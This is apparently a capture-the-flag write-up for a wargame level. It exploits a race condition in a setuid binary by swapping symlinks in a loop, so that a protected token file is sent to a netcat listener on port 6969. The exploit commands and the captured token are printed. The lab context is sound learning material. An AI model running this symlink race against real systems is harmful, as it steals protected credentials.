##LEVEL 10

By executing the level10 file, it says it require to send a file to host if we have access on this file. So bsaically we have to provide a (almost) random file and as a second argument, an IP to connect with it on port 6969.

In way to do it, we need to open the corresponding port, which is 6969.

This can be done with `nc -l 6969`. However, its not doing anything yet.

The server seems to randomly gives different inputs, including the token. So we decided to just loop on the connection and spam it until we get the token.

chmod 777 . && touch a

(while true; do ln -sf a b; ln -sf token b; done)&

while true; do ./level10 b [ip]; done

In some way, we can obtain the token : woupa2yuojeeaaed06riuj63c and log to flag10.
